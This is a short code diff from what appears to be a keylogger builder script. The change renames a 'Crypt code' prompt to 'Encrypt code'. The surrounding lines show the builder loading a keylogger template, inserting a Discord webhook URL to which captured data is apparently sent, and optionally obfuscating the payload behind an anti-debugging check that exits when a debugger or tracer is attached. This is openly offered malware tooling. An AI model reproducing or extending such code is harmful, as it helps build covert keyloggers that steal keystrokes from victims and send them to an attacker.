@@ -115,10 +115,10 @@ def main():
             python_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger.py")
             with open(discord_file, "r", encoding="utf-8") as f:
                 content = f.read()
-            crypt = input("Crypt code [y/n]: ")
-            if crypt.lower().strip() == "y" or crypt.lower().strip() == "yes":
+            encrypt = input("Encrypt code [y/n]: ")
+            if encrypt.lower().strip() == "y" or encrypt.lower().strip() == "yes":
                 content = crypter.obfuscate_code("if hasattr(sys, '_getframe') and (sys._getframe(1).f_trace is not None or sys.gettrace() is not None): sys.exit(1)\n" + content.replace("YOUR_WEBHOOK_URL", url))
-            elif crypt.lower().strip() == "n" or crypt.lower().strip() == "no":
+            elif encrypt.lower().strip() == "n" or encrypt.lower().strip() == "no":
                 pass
             else:
                 print(f"\n{Fore.LIGHTRED_EX}Invalid choice, try again.")
@@ -138,10 +138,10 @@ def main():
             python_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger.py")
             with open(local_file, "r", encoding="utf-8") as f:
                 content = f.read()
-            crypt = input("Crypt code [y/n]: ")
-            if crypt.lower().strip() == "y" or crypt.lower().strip() == "yes":
+            encrypt = input("Encrypt code [y/n]: ")
+            if encrypt.lower().strip() == "y" or encrypt.lower().strip() == "yes":
                 content = crypter.obfuscate_code("if hasattr(sys, '_getframe') and (sys._getframe(1).f_trace is not None or sys.gettrace() is not None): sys.exit(1)\n" + content)
-            elif crypt.lower().strip() == "n" or crypt.lower().strip() == "no":
+            elif encrypt.lower().strip() == "n" or encrypt.lower().strip() == "no":
                 pass
             else:
                 print(f"\n{Fore.LIGHTRED_EX}Invalid choice, try again.")
